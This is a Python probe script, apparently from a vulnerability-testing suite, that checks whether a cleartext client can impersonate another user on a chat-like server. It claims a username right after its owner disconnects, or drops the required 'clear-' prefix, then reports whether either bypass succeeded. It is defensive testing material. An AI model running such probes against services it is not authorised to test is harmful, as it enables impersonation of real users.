"""
PROBE 02 — Username Impersonation via Reclaim Rule
Hypothesis: Can a cleartext user claim another user's username before the 60s
expiry window, or claim a username without the clear- prefix?
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import time
from vulnerabilities.lib.probe import (
    make_handle, connect_cleartext, send_recv, report
)

def run():
    # Step 1: Connect as user A, set username to "clear-victim"
    sock_a, session_a, _ = connect_cleartext()
    r_set = send_recv(sock_a, {
        'request_type': 13, 'session': session_a,
        'request_handle': make_handle(), 'username': 'clear-victim'
    })
    print(f"User A set username clear-victim: {r_set}")

    # Step 2: Disconnect user A explicitly
    send_recv(sock_a, {
        'request_type': 2, 'session': session_a, 'request_handle': make_handle()
    })
    sock_a.close()

    # Step 3: Immediately connect as user B and try to claim "clear-victim"
    sock_b, session_b, _ = connect_cleartext()
    r_claim = send_recv(sock_b, {
        'request_type': 13, 'session': session_b,
        'request_handle': make_handle(), 'username': 'clear-victim'
    })
    print(f"User B claim 'clear-victim' immediately after A disconnects: {r_claim}")

    # Step 4: Also try claiming WITHOUT the clear- prefix
    r_nprefix = send_recv(sock_b, {
        'request_type': 13, 'session': session_b,
        'request_handle': make_handle(), 'username': 'victim'
    })
    print(f"User B claim 'victim' (no clear- prefix): {r_nprefix}")

    claimed_with_prefix = r_claim and r_claim.get(b'response_type') == 34
    claimed_without_prefix = r_nprefix and r_nprefix.get(b'response_type') == 34

    vulnerable = claimed_without_prefix
    evidence = []
    if claimed_with_prefix:
        evidence.append("Cleartext user claimed another's username within 60s window")
    if claimed_without_prefix:
        evidence.append("Cleartext user claimed username without clear- prefix")

    report(
        'PROBE 02 — Username Impersonation',
        "Cleartext user claims username before expiry or bypasses clear- prefix requirement",
        {'claimed_with_prefix': claimed_with_prefix, 'claimed_without_prefix': claimed_without_prefix},
        vulnerable,
        evidence='; '.join(evidence) if evidence else 'Neither bypass succeeded'
    )
    sock_b.close()

if __name__ == '__main__':
    run()
